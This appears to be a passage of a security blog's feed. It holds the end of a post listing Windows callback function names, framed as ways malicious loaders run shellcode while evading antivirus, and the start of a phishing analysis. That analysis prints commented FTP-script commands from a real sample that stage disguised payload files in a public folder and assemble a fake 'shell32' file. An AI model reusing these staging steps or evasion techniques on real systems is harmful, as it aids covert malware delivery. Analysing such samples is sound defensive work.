class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br></pre></td><td class="code"><pre><span class="line">acmDriverEnumCallback</span><br><span class="line">acmDriverProc</span><br><span class="line">acmFilterChooseHookProc</span><br><span class="line">acmFilterEnumCallback</span><br><span class="line">acmFilterTagEnumCallback</span><br><span class="line">acmFormatChooseHookProc</span><br><span class="line">acmFormatEnumCallback</span><br><span class="line">acmFormatTagEnumCallback</span><br><span class="line">acmStreamConvertCallback</span><br><span class="line">AddInterface</span><br><span class="line">AddPropSheetPageProc</span><br><span class="line">AddSecureMemoryCacheCallback</span><br><span class="line">agePaintHook</span><br><span class="line">ageSetupHook</span><br><span class="line">AllocateMemory</span><br><span class="line">APCProc</span><br><span class="line">ApplicationRecoveryCallback</span><br><span class="line">ApplyCallbackFunction</span><br><span class="line">asswordChangeNotify</span><br><span class="line">asswordFilter</span><br><span class="line">AuthzAccessCheckCallback</span><br><span class="line">AuthzComputeGroupsCallback</span><br><span class="line">AuthzFreeGroupsCallback</span><br><span class="line">BindIoCompletionCallback</span><br><span class="line">BlockConvertServicesToStatic</span><br><span class="line">BlockDeleteStaticServices</span><br><span class="line">BrowseCallbackProc</span><br><span class="line">BufferCallback</span><br><span class="line">CallWndProc</span><br><span class="line">CallWndRetProc</span><br><span class="line">capControlCallback</span><br><span class="line">capErrorCallback</span><br><span class="line">capStatusCallback</span><br><span class="line">capVideoStreamCallback</span><br><span class="line">capWaveStreamCallback</span><br><span class="line">capYieldCallback</span><br><span class="line">CBTProc</span><br><span class="line">CCHookProc</span><br><span class="line">CertChainFindByIssuerCallback</span><br><span class="line">CertDllOpenStoreProv</span><br><span class="line">CertEnumPhysicalStoreCallback</span><br><span class="line">CertEnumSystemStoreCallback</span><br><span class="line">CertEnumSystemStoreLocationCallback</span><br><span class="line">CertStoreProvCloseCallback</span><br><span class="line">CertStoreProvDeleteCertCallback</span><br><span class="line">CertStoreProvDeleteCRLCallback</span><br><span class="line">CertStoreProvDeleteCTL</span><br><span class="line">CertStoreProvFindCert</span><br><span class="line">CertStoreProvFindCRL</span><br><span class="line">CertStoreProvFindCTL</span><br><span class="line">CertStoreProvFreeFindCert</span><br><span class="line">CertStoreProvFreeFindCRL</span><br><span class="line">CertStoreProvFreeFindCTL</span><br><span class="line">CertStoreProvGetCertProperty</span><br><span class="line">CertStoreProvGetCRLProperty</span><br><span class="line">CertStoreProvGetCTLProperty</span><br><span class="line">CertStoreProvReadCertCallback</span><br><span class="line">CertStoreProvReadCRLCallback</span><br><span class="line">CertStoreProvReadCTL</span><br><span class="line">CertStoreProvSetCertPropertyCallback</span><br><span class="line">CertStoreProvSetCRLPropertyCallback</span><br><span class="line">CertStoreProvSetCTLProperty</span><br><span class="line">CertStoreProvWriteCertCallback</span><br><span class="line">CertStoreProvWriteCRLCallback</span><br><span class="line">CertStoreProvWriteCTL</span><br><span class="line">CFHookProc</span><br><span class="line">ClaimMediaLabel</span><br><span class="line">CleanupGroupCancelCallback</span><br><span class="line">ClientCallback</span><br><span class="line">ClientCallback_Function</span><br><span class="line">CloseServiceEnumerationHandle</span><br><span class="line">CollectPerformanceData</span><br><span class="line">CompletionProc</span><br><span class="line">ConnectClient</span><br><span class="line">ControlCallback</span><br><span class="line">CopyProgressRoutine</span><br><span class="line">CounterPathCallBack</span><br><span class="line">CQPageProc</span><br><span class="line">CreateServiceEnumerationHandle</span><br><span class="line">CreateStaticService</span><br><span class="line">CryptGetSignerCertificateCallback</span><br><span class="line">CRYPT_ENUM_KEYID_PROP</span><br><span class="line">CRYPT_ENUM_OID_FUNCTION</span><br><span class="line">CRYPT_ENUM_OID_INFO</span><br><span class="line">CRYPT_RETURN_HWND</span><br><span class="line">CRYPT_VERIFY_IMAGE</span><br><span class="line">CspGetDHAgreement</span><br><span class="line">DavAuthCallback</span><br><span class="line">DavFreeCredCallback</span><br><span class="line">DavRegisterAuthCallback</span><br><span class="line">DavUnregisterAuthCallback</span><br><span class="line">DdeCallback</span><br><span class="line">DdeEnableCallback</span><br><span class="line">DeleteInterface</span><br><span class="line">DeleteStaticService</span><br><span class="line">DemandDialRequest</span><br><span class="line">DhcpAddressDelHook</span><br><span class="line">DhcpAddressOfferHook</span><br><span class="line">DhcpControlHook</span><br><span class="line">DhcpDeleteClientHook</span><br><span class="line">DhcpHandleOptionsHook</span><br><span class="line">DhcpNewPktHook</span><br><span class="line">DhcpPktDropHook</span><br><span class="line">DhcpPktSendHook</span><br><span class="line">DhcpServerCalloutEntry</span><br><span class="line">DialogProc</span><br><span class="line">DigestFunction</span><br><span class="line">DisassociateCurrentThreadFromCallback</span><br><span class="line">DisconnectClient</span><br><span class="line">DllCallbackProc</span><br><span class="line">DllGetClassObject</span><br><span class="line">DoUpdateRoutes</span><br><span class="line">DoUpdateServices</span><br><span class="line">DPA_DestroyCallback</span><br><span class="line">DPA_EnumCallback</span><br><span class="line">DrawStateProc</span><br><span class="line">DriverCallback</span><br><span class="line">DSA_DestroyCallback</span><br><span class="line">DSA_EnumCallback</span><br><span class="line">DSEnumAttributesCallback</span><br><span class="line">EditStreamCallback</span><br><span class="line">EditWordBreakProc</span><br><span class="line">EditWordBreakProcEx</span><br><span class="line">EmbeddedUIHandler</span><br><span class="line">EnableCallback</span><br><span class="line">EnhMetaFileProc</span><br><span class="line">EnumCalendarInfoProc</span><br><span class="line">EnumCalendarInfoProcEx</span><br><span class="line">EnumCalendarInfoProcExEx</span><br><span class="line">EnumChildProc</span><br><span class="line">EnumCodePagesProc</span><br><span class="line">EnumDateFormatsProc</span><br><span class="line">EnumDateFormatsProcEx</span><br><span class="line">EnumDateFormatsProcExEx</span><br><span class="line">EnumDesktopProc</span><br><span class="line">EnumDirTreeProc</span><br><span class="line">EnumerateGetNextService</span><br><span class="line">EnumerateLoadedModulesProc64</span><br><span class="line">EnumFontFamExProc</span><br><span class="line">EnumFontFamProc</span><br><span class="line">EnumFontsProc</span><br><span class="line">EnumGeoInfoProc</span><br><span class="line">EnumICMProfilesProcCallback</span><br><span class="line">EnumInputContext</span><br><span class="line">EnumLanguageGroupLocalesProc</span><br><span class="line">EnumLanguageGroupsProc</span><br><span class="line">EnumLocalesProc</span><br><span class="line">EnumLocalesProcEx</span><br><span class="line">EnumMetaFileProc</span><br><span class="line">EnumObjectsProc</span><br><span class="line">EnumPageFilesProc</span><br><span class="line">EnumRegisterWordProc</span><br><span class="line">EnumResLangProc</span><br><span class="line">EnumResNameProc</span><br><span class="line">EnumResTypeProc</span><br><span class="line">EnumThreadWndProc</span><br><span class="line">EnumTimeFormatsProc</span><br><span class="line">EnumTimeFormatsProcEx</span><br><span class="line">EnumUILanguagesProc</span><br><span class="line">EnumWindowsProc</span><br><span class="line">EnumWindowStationProc</span><br><span class="line">EventCallback</span><br><span class="line">EventClassCallback</span><br><span class="line">EventRecordCallback</span><br><span class="line">Event_Handler_Function_Name</span><br><span class="line">EVT_SUBSCRIBE_CALLBACK</span><br><span class="line">ExportCallback</span><br><span class="line">FaxLineCallback</span><br><span class="line">FaxRouteAddFile</span><br><span class="line">FaxRouteDeleteFile</span><br><span class="line">FaxRouteEnumFile</span><br><span class="line">FaxRouteEnumFiles</span><br><span class="line">FaxRouteGetFile</span><br><span class="line">FaxRouteModifyRoutingData</span><br><span class="line">FaxRoutingInstallationCallback</span><br><span class="line">FaxSendCallback</span><br><span class="line">FAX_RECIPIENT_CALLBACK</span><br><span class="line">FExecuteInAppDomainCallback</span><br><span class="line">FiberProc</span><br><span class="line">FileIOCompletionRoutine</span><br><span class="line">FILE_RESTORE_CALLBACK</span><br><span class="line">FindDebugInfoFileProc</span><br><span class="line">FindExecutableImageProc</span><br><span class="line">FLockClrVersionCallback</span><br><span class="line">FlsCallback</span><br><span class="line">FNCCERTDISPLAYPROC</span><br><span class="line">FNCFILTERPROC</span><br><span class="line">FNCMFILTERPROC</span><br><span class="line">FNCMHOOKPROC</span><br><span class="line">FNDAENUMCALLBACK</span><br><span class="line">FNDPAENUMCALLBACK</span><br><span class="line">FNDSAENUMCALLBACK</span><br><span class="line">FNPEER_FREE_SECURITY_DATA</span><br><span class="line">FNPEER_SECURE_RECORD</span><br><span class="line">FNPEER_VALIDATE_RECORD</span><br><span class="line">FN_AUTHENTICATION_CALLBACK</span><br><span class="line">FN_AUTHENTICATION_CALLBACK_EX</span><br><span class="line">FN_BLUETOOTH_ENUM_ATTRIBUTES_CALLBACK</span><br><span class="line">FN_CDF_PARSE_ERROR_CALLBACK</span><br><span class="line">FN_CERT_CHAIN_FIND_BY_ISSUER_CALLBACK</span><br><span class="line">FN_CERT_DLL_OPEN_STORE_PROV_FUNC</span><br><span class="line">FN_CERT_ENUM_PHYSICAL_STORE</span><br><span class="line">FN_CERT_ENUM_SYSTEM_STORE</span><br><span class="line">FN_CERT_STORE_PROV_CLOSE</span><br><span class="line">FN_CERT_STORE_PROV_DELETE_CERT</span><br><span class="line">FN_CERT_STORE_PROV_DELETE_CRL</span><br><span class="line">FN_CERT_STORE_PROV_READ_CERT</span><br><span class="line">FN_CERT_STORE_PROV_READ_CRL</span><br><span class="line">FN_CERT_STORE_PROV_SET_CERT_PROPERTY</span><br><span class="line">FN_CERT_STORE_PROV_SET_CRL_PROPERTY</span><br><span class="line">FN_CERT_STORE_PROV_SET_CTL_PROPERTY</span><br><span class="line">FN_CERT_STORE_PROV_WRITE_CERT</span><br><span class="line">FN_CERT_STORE_PROV_WRITE_CRL</span><br><span class="line">FN_CERT_STORE_PROV_WRITE_CTL</span><br><span class="line">FN_CRYPT_XML_CREATE_TRANSFORM</span><br><span class="line">FN_CRYPT_XML_DATA_PROVIDER_CLOSE</span><br><span class="line">FN_CRYPT_XML_DATA_PROVIDER_READ</span><br><span class="line">FN_CRYPT_XML_ENUM_ALG_INFO</span><br><span class="line">FN_CRYPT_XML_WRITE_CALLBACK</span><br><span class="line">FN_DEVICE_CALLBACK</span><br><span class="line">FN_WdsCliCallback</span><br><span class="line">FN_WdsCliTraceFunction</span><br><span class="line">FN_WdsTransportClientReceiveContents</span><br><span class="line">FN_WdsTransportClientReceiveMetadata</span><br><span class="line">FN_WdsTransportClientSessionComplete</span><br><span class="line">FN_WdsTransportClientSessionStart</span><br><span class="line">FN_WdsTransportClientSessionStartEx</span><br><span class="line">ForegroundIdleProc</span><br><span class="line">FreeMemory</span><br><span class="line">FRHookProc</span><br><span class="line">FuncReturnhWnd</span><br><span class="line">FunctionTableAccessProc64</span><br><span class="line">FuncVerifyImage</span><br><span class="line">GenerateGroupPolicy</span><br><span class="line">GetApplicationRecoveryCallback</span><br><span class="line">GetEventMessage</span><br><span class="line">GetFirstOrderedService</span><br><span class="line">GetGlobalInfo</span><br><span class="line">GetInterfaceInfo</span><br><span class="line">GetMfeStatus</span><br><span class="line">GetModuleBaseProc64</span><br><span class="line">GetMsgProc</span><br><span class="line">GetNeighbors</span><br><span class="line">GetNextOrderedService</span><br><span class="line">GetRequest</span><br><span class="line">GetResponse</span><br><span class="line">GetServiceCount</span><br><span class="line">GetSize</span><br><span class="line">GetTSAudioEndpointEnumeratorForSession</span><br><span class="line">gluNurbsCallback</span><br><span class="line">gluQuadricCallback</span><br><span class="line">gluTessCallback</span><br><span class="line">GopherAttributeEnumerator</span><br><span class="line">HandlerEx</span><br><span class="line">HandlerRoutine</span><br><span class="line">honeCallbackFunc</span><br><span class="line">hone_Event</span><br><span class="line">HyphenateProc</span><br><span class="line">ICMProgressProcCallback</span><br><span class="line">ImportCallback</span><br><span class="line">InitHelperDll</span><br><span class="line">InitializeChangeNotify</span><br><span class="line">InitializeEmbeddedUI</span><br><span class="line">InitOnceCallback</span><br><span class="line">InsertAt</span><br><span class="line">InstalluiHandler</span><br><span class="line">InstalluiHandlerRecord</span><br><span class="line">INSTALLUI_HANDLER</span><br><span class="line">InterfaceStatus</span><br><span class="line">InternetSetStatusCallback</span><br><span class="line">InternetStatusCallback</span><br><span class="line">INTERNET_STATUS_CALLBACK</span><br><span class="line">IoCompletionCallback</span><br><span class="line">IOProc</span><br><span class="line">IsService</span><br><span class="line">JournalPlaybackProc</span><br><span class="line">JournalRecordProc</span><br><span class="line">KeyboardProc</span><br><span class="line">lineCallbackFunc</span><br><span class="line">LineDDAProc</span><br><span class="line">Line_Event</span><br><span class="line">LOG_FULL_HANDLER_CALLBACK</span><br><span class="line">LOG_TAIL_ADVANCE_CALLBACK</span><br><span class="line">LOG_UNPINNED_CALLBACK</span><br><span class="line">LowLevelKeyboardProc</span><br><span class="line">LowLevelMouseProc</span><br><span class="line">LPCQADDFORMSPROC</span><br><span class="line">LPCQADDPAGESPROC</span><br><span class="line">LPCQPAGEPROC</span><br><span class="line">LPDISPLAYVAL</span><br><span class="line">LPDSENUMATTRIBUTES</span><br><span class="line">LPEVALCOMCALLBACK</span><br><span class="line">LPFNDFMCALLBACK</span><br><span class="line">LPFNVIEWCALLBACK</span><br><span class="line">MagGetImageScalingCallback</span><br><span class="line">MagImageScalingCallback</span><br><span class="line">MagSetImageScalingCallback</span><br><span class="line">MappingCallbackProc</span><br><span class="line">MaxMediaLabel</span><br><span class="line">MessageProc</span><br><span class="line">MFAddPeriodicCallback</span><br><span class="line">MFInvokeCallback</span><br><span class="line">MFPERIODICCALLBACK</span><br><span class="line">MFRemovePeriodicCallback</span><br><span class="line">MgmCreationAlertCallback</span><br><span class="line">MgmDisableIgmpCallback</span><br><span class="line">MgmJoinAlertCallback</span><br><span class="line">MgmLocalJoinCallback</span><br><span class="line">MgmLocalLeaveCallback</span><br><span class="line">MgmPruneAlertCallback</span><br><span class="line">MgmRpfCallback</span><br><span class="line">MgmWrongIfCallback</span><br><span class="line">MGM_ENABLE_IGMP_CALLBACK</span><br><span class="line">MibCreate</span><br><span class="line">MibDelete</span><br><span class="line">MIBEntryCreate</span><br><span class="line">MIBEntryDelete</span><br><span class="line">MIBEntryGet</span><br><span class="line">MIBEntryGetFirst</span><br><span class="line">MIBEntryGetNext</span><br><span class="line">MIBEntrySet</span><br><span class="line">MibGet</span><br><span class="line">MibGetFirst</span><br><span class="line">MibGetNext</span><br><span class="line">MibGetTrapInfo</span><br><span class="line">MibSet</span><br><span class="line">MibSetTrapInfo</span><br><span class="line">MidiInProc</span><br><span class="line">MidiOutProc</span><br><span class="line">MiniDumpCallback</span><br><span class="line">MMCFreeNotifyHandle</span><br><span class="line">MMCPropertyChangeNotify</span><br><span class="line">MMCPropertyHelp</span><br><span class="line">MMCPropPageCallback</span><br><span class="line">MMIOProc</span><br><span class="line">MonitorEnumProc</span><br><span class="line">MouseProc</span><br><span class="line">MRUCMPPROC</span><br><span class="line">MyStatusProc</span><br><span class="line">OFNHookProc</span><br><span class="line">OFNHookProcOldStyle</span><br><span class="line">OpenPerformanceData</span><br><span class="line">ORASADFunc</span><br><span class="line">OutOfProcessExceptionEventCallback</span><br><span class="line">OutOfProcessExceptionEventDebuggerLaunchCallback</span><br><span class="line">OutOfProcessExceptionEventSignatureCallback</span><br><span class="line">OutputProc</span><br><span class="line">PIO_APC_ROUTINE</span><br><span class="line">QueryPower</span><br><span class="line">RadiusExtensionFreeAttributes</span><br><span class="line">RadiusExtensionInit</span><br><span class="line">RadiusExtensionProcess</span><br><span class="line">RadiusExtensionProcess2</span><br><span class="line">RadiusExtensionProcessEx</span><br><span class="line">RadiusExtensionTerm</span><br><span class="line">RASADFunc</span><br><span class="line">RasAdminAcceptNewConnection</span><br><span class="line">RasAdminConnectionHangupNotification</span><br><span class="line">RasAdminGetIpAddressForUser</span><br><span class="line">RasAdminReleaseIpAddress</span><br><span class="line">RasCustomDeleteEntryNotify</span><br><span class="line">RasCustomDial</span><br><span class="line">RasCustomDialDlg</span><br><span class="line">RasCustomEntryDlg</span><br><span class="line">RasCustomHangUp</span><br><span class="line">RasCustomScriptExecute</span><br><span class="line">RasDialFunc</span><br><span class="line">RasDialFunc1</span><br><span class="line">RasDialFunc2</span><br><span class="line">RasEapBegin</span><br><span class="line">RasEapEnd</span><br><span class="line">RasEapFreeMemory</span><br><span class="line">RasEapGetIdentity</span><br><span class="line">RasEapGetInfo</span><br><span class="line">RasEapInitialize</span><br><span class="line">RasEapInvokeConfigUI</span><br><span class="line">RasEapInvokeInteractiveUI</span><br><span class="line">RasEapMakeMessage</span><br><span class="line">RasFreeBuffer</span><br><span class="line">RasGetBuffer</span><br><span class="line">RasPBDlgFunc</span><br><span class="line">RasReceiveBuffer</span><br><span class="line">RasRetrieveBuffer</span><br><span class="line">RasSecurityDialogBegin</span><br><span class="line">RasSecurityDialogEnd</span><br><span class="line">RasSendBuffer</span><br><span class="line">RasSetCommSettings</span><br><span class="line">ReaderScroll</span><br><span class="line">ReadProcessMemoryProc64</span><br><span class="line">RegisterApplicationRecoveryCallback</span><br><span class="line">RegisterCallback</span><br><span class="line">RegisterProtocol</span><br><span class="line">RegisterWaitChainCOMCallback</span><br><span class="line">RemoveAt</span><br><span class="line">RemoveSecureMemoryCacheCallback</span><br><span class="line">RemoveTraceCallback</span><br><span class="line">rintHookProc</span><br><span class="line">RM_WRITE_STATUS_CALLBACK</span><br><span class="line">rocessGroupPolicy</span><br><span class="line">rocessGroupPolicyEx</span><br><span class="line">rogressNotificationCallback</span><br><span class="line">ropEnumProc</span><br><span class="line">ropEnumProcEx</span><br><span class="line">ropSheetPageProc</span><br><span class="line">ropSheetProc</span><br><span class="line">RpcAuthKeyRetrievalFn</span><br><span class="line">RpcMgmtAuthorizationFn</span><br><span class="line">RpcnotificationRoutine</span><br><span class="line">RpcObjectInqFn</span><br><span class="line">RPC_IF_CALLBACK_FN</span><br><span class="line">RtlInstallFunctionTableCallback</span><br><span class="line">RTM_ENTITY_EXPORT_METHOD</span><br><span class="line">RTM_EVENT_CALLBACK</span><br><span class="line">SampleCommand</span><br><span class="line">SampleCommit</span><br><span class="line">SampleConnect</span><br><span class="line">SampleDump</span><br><span class="line">SampleOsVersionCheck</span><br><span class="line">SampleStartHelper</span><br><span class="line">SampleStop</span><br><span class="line">SampleStopHelper</span><br><span class="line">SceSvcAttachmentAnalyze</span><br><span class="line">SceSvcAttachmentConfig</span><br><span class="line">SceSvcAttachmentUpdate</span><br><span class="line">SecureMemoryCacheCallback</span><br><span class="line">SendAsyncProc</span><br><span class="line">SendMessageCallback</span><br><span class="line">ServiceMain</span><br><span class="line">SetAt</span><br><span class="line">SetGlobalInfo</span><br><span class="line">SetInterfaceInfo</span><br><span class="line">SetInterfaceReceiveType</span><br><span class="line">SetLineRecoCallback</span><br><span class="line">SetPower</span><br><span class="line">SetProviderStatusFunc</span><br><span class="line">SetProviderStatusInfoFreeFunc</span><br><span class="line">SetResponseType</span><br><span class="line">SetTraceCallback</span><br><span class="line">SetupDefaultQueueCallback</span><br><span class="line">SetupHookProc</span><br><span class="line">SetupInitDefaultQueueCallback</span><br><span class="line">SetupTermDefaultQueueCallback</span><br><span class="line">ShellProc</span><br><span class="line">ShutdownEmbeddedUI</span><br><span class="line">SimpleCallback</span><br><span class="line">SNMPAPI_CALLBACK</span><br><span class="line">SnmpExtensionClose</span><br><span class="line">SnmpExtensionInit</span><br><span class="line">SnmpExtensionInitEx</span><br><span class="line">SnmpExtensionMonitor</span><br><span class="line">SnmpExtensionQuery</span><br><span class="line">SnmpExtensionQueryEx</span><br><span class="line">SnmpExtensionTrap</span><br><span class="line">SoundSentryProc</span><br><span class="line">SP_FILE_CALLBACK</span><br><span class="line">StackSnapshotCallback</span><br><span class="line">StartComplete</span><br><span class="line">StartProtocol</span><br><span class="line">StatusCallback</span><br><span class="line">StatusMessageCallback</span><br><span class="line">StatusRoutine</span><br><span class="line">StopProtocol</span><br><span class="line">SymEnumerateModulesProc64</span><br><span class="line">SymEnumerateSymbolsProc64</span><br><span class="line">SymEnumLinesProc</span><br><span class="line">SymEnumProcessesProc</span><br><span class="line">SymEnumSourceFilesProc</span><br><span class="line">SymEnumSourceFileTokensProc</span><br><span class="line">SymEnumSymbolsProc</span><br><span class="line">SymFindFileInPathProc</span><br><span class="line">SymRegisterCallback</span><br><span class="line">SymRegisterCallbackProc64</span><br><span class="line">SymRegisterFunctionEntryCallback</span><br><span class="line">SymRegisterFunctionEntryCallbackProc64</span><br><span class="line">SyncUpdateProc</span><br><span class="line">SysMsgProc</span><br><span class="line">TaskDialogCallbackProc</span><br><span class="line">ThreadProc</span><br><span class="line">TimeProc</span><br><span class="line">TimeProvClose</span><br><span class="line">TimeProvCommand</span><br><span class="line">TimeProvOpen</span><br><span class="line">TimerAPCProc</span><br><span class="line">TimerCallback</span><br><span class="line">TimerProc</span><br><span class="line">TranslateAddressProc64</span><br><span class="line">TranslateDispatch</span><br><span class="line">TrySubmitThreadpoolCallback</span><br><span class="line">UiaEventCallback</span><br><span class="line">UiaProviderCallback</span><br><span class="line">UiaRegisterProviderCallback</span><br><span class="line">UmsSchedulerProc</span><br><span class="line">UnbindInterface</span><br><span class="line">UndeleteFile</span><br><span class="line">UnregisterApplicationRecoveryCallback</span><br><span class="line">ValidateRoute</span><br><span class="line">VectoredHandler</span><br><span class="line">VERIFYSERVERCERT</span><br><span class="line">WaitCallback</span><br><span class="line">WaitChainCallback</span><br><span class="line">WaitOrTimerCallback</span><br><span class="line">waveInProc</span><br><span class="line">waveOutProc</span><br><span class="line">WdsTransportClientRegisterCallback</span><br><span class="line">WdsTransportProviderCloseContent</span><br><span class="line">WdsTransportProviderCloseInstance</span><br><span class="line">WdsTransportProviderCompareContent</span><br><span class="line">WdsTransportProviderCreateInstance</span><br><span class="line">WdsTransportProviderDumpState</span><br><span class="line">WdsTransportProviderGetContentMetadata</span><br><span class="line">WdsTransportProviderGetContentSize</span><br><span class="line">WdsTransportProviderInitialize</span><br><span class="line">WdsTransportProviderOpenContent</span><br><span class="line">WdsTransportProviderReadContent</span><br><span class="line">WdsTransportProviderRefreshSettings</span><br><span class="line">WdsTransportProviderShutdown</span><br><span class="line">WdsTransportProviderUserAccessCheck</span><br><span class="line">WdsTransportServerRegisterCallback</span><br><span class="line">WinBioCaptureSampleWithCallback</span><br><span class="line">WinBioEnrollCaptureWithCallback</span><br><span class="line">WinBioIdentifyWithCallback</span><br><span class="line">WinBioLocateSensorWithCallback</span><br><span class="line">WinBioVerifyWithCallback</span><br><span class="line">WindowProc</span><br><span class="line">WinEventProc</span><br><span class="line">WinHttpSetStatusCallback</span><br><span class="line">WINHTTP_STATUS_CALLBACK</span><br><span class="line">WLAN_NOTIFICATION_CALLBACK</span><br><span class="line">WorkCallback</span><br><span class="line">WPUQueryBlockingCallback</span><br><span class="line">xeProviderInitialize</span><br><span class="line">xeProviderRecvRequest</span><br><span class="line">xeProviderServiceControl</span><br><span class="line">xeProviderShutdown</span><br><span class="line">xeRegisterCallback</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;恶意的Loader和PIS（Position-Independent Shellcode）会使用各种技术来绕过AV/EDR和安全人员的分析，其中代码执行这个环节经常会通过“回调函数”的方式来隐蔽的执行。回调的本质是将函数A的地址传给函数B，在函数B执行的过程中，触发某个条件</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="回调函数" scheme="http://example.com/tags/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>一次简单的钓鱼分析之FTP执行LNK</title>
    <link href="http://example.com/2025/09/03/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%92%93%E9%B1%BC%E5%88%86%E6%9E%90%E4%B9%8BFTP%E6%89%A7%E8%A1%8CLNK/"/>
    <id>http://example.com/2025/09/03/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%92%93%E9%B1%BC%E5%88%86%E6%9E%90%E4%B9%8BFTP%E6%89%A7%E8%A1%8CLNK/</id>
    <published>2025-09-03T13:37:39.000Z</published>
    <updated>2025-09-03T13:45:47.351Z</updated>
    
    <content type="html"><![CDATA[<h1 id="01-引言"><a href="#01-引言" class="headerlink" title="01 引言"></a>01 引言</h1><p>吾爱上看到一篇病毒分析文章，初步看了一眼像是FTP执行LNK的方式，早在2022年甚至更早就公开的技术了，好像24年HVV期间用来社工钓鱼还火过一阵，借着这个机会学习记录一下<br>原文地址：<a href="https://www.52pojie.cn/thread-2054571-1-1.html">https://www.52pojie.cn/thread-2054571-1-1.html</a></p><h1 id="02-正文"><a href="#02-正文" class="headerlink" title="02 正文"></a>02 正文</h1><p>FTP的交互式命令行中，可以通过!的方式执行命令，如下图<br><img src="/2025/09/03/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%92%93%E9%B1%BC%E5%88%86%E6%9E%90%E4%B9%8BFTP%E6%89%A7%E8%A1%8CLNK/01.png" alt="image"><br>还有一个命令行选项-s，可以批量执行某个文件中的命令，如下图<br><img src="/2025/09/03/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%92%93%E9%B1%BC%E5%88%86%E6%9E%90%E4%B9%8BFTP%E6%89%A7%E8%A1%8CLNK/02.png" alt="image"></p><p>下面是钓鱼样本中的部分命令，在注释中有详细解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># copy /Y                       目的路径有同名文件时，不提示直接覆盖</span><br><span class="line"># &quot;_\_\_\_\_\_\_\_\doc\*.*&quot;     恶意攻击者刻意构造的多级目录，每级目录的名字都为_</span><br><span class="line"># &gt;nul                          正常copy一个文件，cmd会有输出，移动了哪些文件，此命令屏蔽这些输出</span><br><span class="line">!call copy /Y &quot;_\_\_\_\_\_\_\_\doc\*.*&quot; &quot;_\&quot; &gt;nul</span><br><span class="line"></span><br><span class="line"># 以最大化窗口用文件资源管理器打开目录_</span><br><span class="line">!call start /max explorer _</span><br><span class="line"></span><br><span class="line"># 创建目录C:\Users\Public\Update</span><br><span class="line">!call mkdir C:\Users\Public\Update &gt;nul</span><br><span class="line"></span><br><span class="line"># 拷贝多级目录下的header.doc到C:\Users\Public\Update下，并重命名为header</span><br><span class="line">!call copy /Y _\_\_\_\_\_\_\_\_rels\header.doc C:\Users\Public\Update\header &gt;nul</span><br><span class="line"></span><br><span class="line"># 拷贝多级目录下的sc.doc到C:\Users\Public\Update下，并重命名为sc</span><br><span class="line">!call copy /Y _\_\_\_\_\_\_\_\_rels\sc.doc C:\Users\Public\Update\sc &gt;nul</span><br><span class="line"></span><br><span class="line"># %time%是cmd内置的一个环境变量，echo后输出的是17:52:38.46这种形式，其中%TIME:~4,1%表示取索引4（第5个字符）开始的1个字符，也就是2，如果是%TIME:~3,2%就是取52</span><br><span class="line"># 因为没有完整的样本，猜测病毒作者前面已经将%TIME%复制给一个变量，否则调用%TIME:~4,1%取的值是不固定的</span><br><span class="line">!call copy /Y _\_\_\_\_\_\_\_\_rels\%TIME:~4,1%.doc C:\Users\Public\Update\shell32 &gt;nul</span><br><span class="line"></span><br><span class="line"># %random%是cmd内置的一个环境变量，随机生成一个0-32767之间的整数，包含0和32767</span><br><span class="line"># 随机生成一个0-32767之间的整数，追加到shell32中</span><br><span class="line">!call echo %RANDOM%&gt;&gt;C:\Users\Public\Update\shell32 &gt;nul</span><br><span class="line"></span><br><span class="line"># copy /b     